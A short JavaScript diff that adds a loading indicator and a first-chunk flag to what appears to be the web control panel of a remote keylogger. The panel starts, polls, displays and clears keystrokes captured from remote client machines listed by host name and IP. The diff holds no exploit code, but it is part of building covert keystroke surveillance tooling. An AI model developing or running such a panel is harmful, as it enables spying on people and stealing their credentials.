@@ -9,6 +9,7 @@ $('target').textContent = `${hostName} @ ${hostIp}`;
 let running = false;
 let lastSeenId = 0;
 let timer = null;
+let firstChunkSeen = false;
 
 async function toggle() {
   if (running) {
@@ -19,6 +20,8 @@ async function toggle() {
     $('dot').classList.remove('on');
     stopPolling();
   } else {
+    $('log').innerHTML = '<div class="loading" style="padding:48px;display:flex;flex-direction:column;align-items:center;gap:14px"><div class="ring"></div><span style="color:var(--muted);font-size:12px">waiting for first keystroke…</span></div>';
+    firstChunkSeen = false;
     await fetch(`/api/clients/${clientId}/keylog/start`, { method: 'POST' });
     running = true;
     $('toggle').textContent = 'stop logging';
@@ -42,6 +45,11 @@ async function poll() {
 }
 
 function append(row) {
+  if (!firstChunkSeen) {
+    firstChunkSeen = true;
+    const l = document.querySelector('.log .loading');
+    if (l) l.remove();
+  }
   const el = document.createElement('div');
   el.className = 'chunk';
   const t = new Date(row.created_at).toLocaleTimeString();
@@ -72,6 +80,7 @@ $('clear').addEventListener('click', async () => {
   await fetch(`/api/clients/${clientId}/keylog`, { method: 'DELETE' });
   $('log').innerHTML = '';
   lastSeenId = 0;
+  firstChunkSeen = false;
 });
 $('close').addEventListener('click', () => window.close());
 
